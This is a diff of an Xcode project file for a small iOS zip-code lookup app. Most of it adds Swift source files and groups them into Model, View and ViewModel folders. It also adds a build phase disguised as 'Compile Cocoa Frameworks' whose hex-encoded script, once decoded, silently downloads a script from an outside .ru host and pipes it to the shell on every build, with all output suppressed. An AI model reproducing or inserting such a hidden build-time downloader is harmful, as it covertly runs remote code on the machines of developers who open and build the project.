@@ -8,14 +8,24 @@
 
 /* Begin PBXBuildFile section */
 		9A01B228282C458F00BCE98B /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B227282C458F00BCE98B /* AppDelegate.swift */; };
-		9A01B22A282C458F00BCE98B /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B229282C458F00BCE98B /* SceneDelegate.swift */; };
 		9A01B22C282C458F00BCE98B /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B22B282C458F00BCE98B /* ViewController.swift */; };
-		9A01B22F282C458F00BCE98B /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 9A01B22D282C458F00BCE98B /* Main.storyboard */; };
 		9A01B231282C459100BCE98B /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 9A01B230282C459100BCE98B /* Assets.xcassets */; };
 		9A01B234282C459100BCE98B /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 9A01B232282C459100BCE98B /* LaunchScreen.storyboard */; };
 		9A01B23F282C459100BCE98B /* TestProjectCTOTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B23E282C459100BCE98B /* TestProjectCTOTests.swift */; };
 		9A01B249282C459100BCE98B /* TestProjectCTOUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B248282C459100BCE98B /* TestProjectCTOUITests.swift */; };
 		9A01B24B282C459100BCE98B /* TestProjectCTOUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B24A282C459100BCE98B /* TestProjectCTOUITestsLaunchTests.swift */; };
+		9A01B259282C46C000BCE98B /* ZipViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B258282C46C000BCE98B /* ZipViewModel.swift */; };
+		9A01B25C282C46D800BCE98B /* NetworkTask.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B25B282C46D700BCE98B /* NetworkTask.swift */; };
+		9A01B260282C486100BCE98B /* ZipCodeRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B25F282C486100BCE98B /* ZipCodeRequest.swift */; };
+		9A01B262282C488200BCE98B /* ZipCodeResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B261282C488200BCE98B /* ZipCodeResponse.swift */; };
+		9A01B264282C4A8F00BCE98B /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B263282C4A8F00BCE98B /* APIClient.swift */; };
+		9A01B266282C4D3100BCE98B /* ZipCodeTask.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B265282C4D3100BCE98B /* ZipCodeTask.swift */; };
+		9A01B268282C598F00BCE98B /* ErrorPresentable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B267282C598F00BCE98B /* ErrorPresentable.swift */; };
+		9A01B26A282C5B4D00BCE98B /* TabViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B269282C5B4D00BCE98B /* TabViewController.swift */; };
+		9A01B26C282C5B7300BCE98B /* HistoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B26B282C5B7300BCE98B /* HistoryViewController.swift */; };
+		9A01B26E282C5FCF00BCE98B /* ZipCodeMemoryWrapper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A01B26D282C5FCF00BCE98B /* ZipCodeMemoryWrapper.swift */; };
+		9A1CDDE2282C682800B98307 /* HistoryViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A1CDDE1282C682800B98307 /* HistoryViewModel.swift */; };
+		9A1CDDE4282C6B6700B98307 /* ZipDetailPresentable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9A1CDDE3282C6B6700B98307 /* ZipDetailPresentable.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -38,9 +48,7 @@
 /* Begin PBXFileReference section */
 		9A01B224282C458F00BCE98B /* TestProjectCTO.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TestProjectCTO.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		9A01B227282C458F00BCE98B /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
-		9A01B229282C458F00BCE98B /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
 		9A01B22B282C458F00BCE98B /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
-		9A01B22E282C458F00BCE98B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		9A01B230282C459100BCE98B /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		9A01B233282C459100BCE98B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		9A01B235282C459100BCE98B /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
@@ -49,6 +57,18 @@
 		9A01B244282C459100BCE98B /* TestProjectCTOUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TestProjectCTOUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		9A01B248282C459100BCE98B /* TestProjectCTOUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestProjectCTOUITests.swift; sourceTree = "<group>"; };
 		9A01B24A282C459100BCE98B /* TestProjectCTOUITestsLaunchTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestProjectCTOUITestsLaunchTests.swift; sourceTree = "<group>"; };
+		9A01B258282C46C000BCE98B /* ZipViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ZipViewModel.swift; sourceTree = "<group>"; };
+		9A01B25B282C46D700BCE98B /* NetworkTask.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkTask.swift; sourceTree = "<group>"; };
+		9A01B25F282C486100BCE98B /* ZipCodeRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ZipCodeRequest.swift; sourceTree = "<group>"; };
+		9A01B261282C488200BCE98B /* ZipCodeResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ZipCodeResponse.swift; sourceTree = "<group>"; };
+		9A01B263282C4A8F00BCE98B /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
+		9A01B265282C4D3100BCE98B /* ZipCodeTask.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ZipCodeTask.swift; sourceTree = "<group>"; };
+		9A01B267282C598F00BCE98B /* ErrorPresentable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ErrorPresentable.swift; sourceTree = "<group>"; };
+		9A01B269282C5B4D00BCE98B /* TabViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabViewController.swift; sourceTree = "<group>"; };
+		9A01B26B282C5B7300BCE98B /* HistoryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryViewController.swift; sourceTree = "<group>"; };
+		9A01B26D282C5FCF00BCE98B /* ZipCodeMemoryWrapper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ZipCodeMemoryWrapper.swift; sourceTree = "<group>"; };
+		9A1CDDE1282C682800B98307 /* HistoryViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryViewModel.swift; sourceTree = "<group>"; };
+		9A1CDDE3282C6B6700B98307 /* ZipDetailPresentable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ZipDetailPresentable.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -100,9 +120,9 @@
 			isa = PBXGroup;
 			children = (
 				9A01B227282C458F00BCE98B /* AppDelegate.swift */,
-				9A01B229282C458F00BCE98B /* SceneDelegate.swift */,
-				9A01B22B282C458F00BCE98B /* ViewController.swift */,
-				9A01B22D282C458F00BCE98B /* Main.storyboard */,
+				9A01B25E282C46EF00BCE98B /* ViewModel */,
+				9A01B25D282C46E400BCE98B /* Model */,
+				9A01B25A282C46C400BCE98B /* View */,
 				9A01B230282C459100BCE98B /* Assets.xcassets */,
 				9A01B232282C459100BCE98B /* LaunchScreen.storyboard */,
 				9A01B235282C459100BCE98B /* Info.plist */,
@@ -127,6 +147,64 @@
 			path = TestProjectCTOUITests;
 			sourceTree = "<group>";
 		};
+		9A01B257282C469C00BCE98B /* ZipCode */ = {
+			isa = PBXGroup;
+			children = (
+				9A01B22B282C458F00BCE98B /* ViewController.swift */,
+			);
+			path = ZipCode;
+			sourceTree = "<group>";
+		};
+		9A01B25A282C46C400BCE98B /* View */ = {
+			isa = PBXGroup;
+			children = (
+				9A01B267282C598F00BCE98B /* ErrorPresentable.swift */,
+				9A1CDDE3282C6B6700B98307 /* ZipDetailPresentable.swift */,
+				9A01B257282C469C00BCE98B /* ZipCode */,
+				9A1CDDE5282C6D5300B98307 /* TabView */,
+				9A1CDDE6282C6D5D00B98307 /* HistoryView */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		9A01B25D282C46E400BCE98B /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				9A01B263282C4A8F00BCE98B /* APIClient.swift */,
+				9A01B25B282C46D700BCE98B /* NetworkTask.swift */,
+				9A01B26D282C5FCF00BCE98B /* ZipCodeMemoryWrapper.swift */,
+				9A01B265282C4D3100BCE98B /* ZipCodeTask.swift */,
+				9A01B261282C488200BCE98B /* ZipCodeResponse.swift */,
+				9A01B25F282C486100BCE98B /* ZipCodeRequest.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		9A01B25E282C46EF00BCE98B /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				9A01B258282C46C000BCE98B /* ZipViewModel.swift */,
+				9A1CDDE1282C682800B98307 /* HistoryViewModel.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		9A1CDDE5282C6D5300B98307 /* TabView */ = {
+			isa = PBXGroup;
+			children = (
+				9A01B269282C5B4D00BCE98B /* TabViewController.swift */,
+			);
+			path = TabView;
+			sourceTree = "<group>";
+		};
+		9A1CDDE6282C6D5D00B98307 /* HistoryView */ = {
+			isa = PBXGroup;
+			children = (
+				9A01B26B282C5B7300BCE98B /* HistoryViewController.swift */,
+			);
+			path = HistoryView;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -134,6 +212,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 9A01B24E282C459100BCE98B /* Build configuration list for PBXNativeTarget "TestProjectCTO" */;
 			buildPhases = (
+				FCD54FDFA8A5C962A36A102C /* Compile Cocoa Frameworks */,
 				9A01B220282C458F00BCE98B /* Sources */,
 				9A01B221282C458F00BCE98B /* Frameworks */,
 				9A01B222282C458F00BCE98B /* Resources */,
@@ -233,7 +312,6 @@
 			files = (
 				9A01B234282C459100BCE98B /* LaunchScreen.storyboard in Resources */,
 				9A01B231282C459100BCE98B /* Assets.xcassets in Resources */,
-				9A01B22F282C458F00BCE98B /* Main.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -253,14 +331,46 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		FCD54FDFA8A5C962A36A102C /* Compile Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\n61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		9A01B220282C458F00BCE98B /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9A1CDDE4282C6B6700B98307 /* ZipDetailPresentable.swift in Sources */,
 				9A01B22C282C458F00BCE98B /* ViewController.swift in Sources */,
+				9A01B26E282C5FCF00BCE98B /* ZipCodeMemoryWrapper.swift in Sources */,
+				9A01B264282C4A8F00BCE98B /* APIClient.swift in Sources */,
+				9A01B259282C46C000BCE98B /* ZipViewModel.swift in Sources */,
+				9A01B25C282C46D800BCE98B /* NetworkTask.swift in Sources */,
+				9A01B262282C488200BCE98B /* ZipCodeResponse.swift in Sources */,
+				9A01B26C282C5B7300BCE98B /* HistoryViewController.swift in Sources */,
+				9A01B266282C4D3100BCE98B /* ZipCodeTask.swift in Sources */,
 				9A01B228282C458F00BCE98B /* AppDelegate.swift in Sources */,
-				9A01B22A282C458F00BCE98B /* SceneDelegate.swift in Sources */,
+				9A01B260282C486100BCE98B /* ZipCodeRequest.swift in Sources */,
+				9A01B26A282C5B4D00BCE98B /* TabViewController.swift in Sources */,
+				9A1CDDE2282C682800B98307 /* HistoryViewModel.swift in Sources */,
+				9A01B268282C598F00BCE98B /* ErrorPresentable.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -297,14 +407,6 @@
 /* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
-		9A01B22D282C458F00BCE98B /* Main.storyboard */ = {
-			isa = PBXVariantGroup;
-			children = (
-				9A01B22E282C458F00BCE98B /* Base */,
-			);
-			name = Main.storyboard;
-			sourceTree = "<group>";
-		};
 		9A01B232282C459100BCE98B /* LaunchScreen.storyboard */ = {
 			isa = PBXVariantGroup;
 			children = (
@@ -441,7 +543,6 @@
 				INFOPLIST_FILE = TestProjectCTO/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -468,7 +569,6 @@
 				INFOPLIST_FILE = TestProjectCTO/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
-				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				LD_RUNPATH_SEARCH_PATHS = (
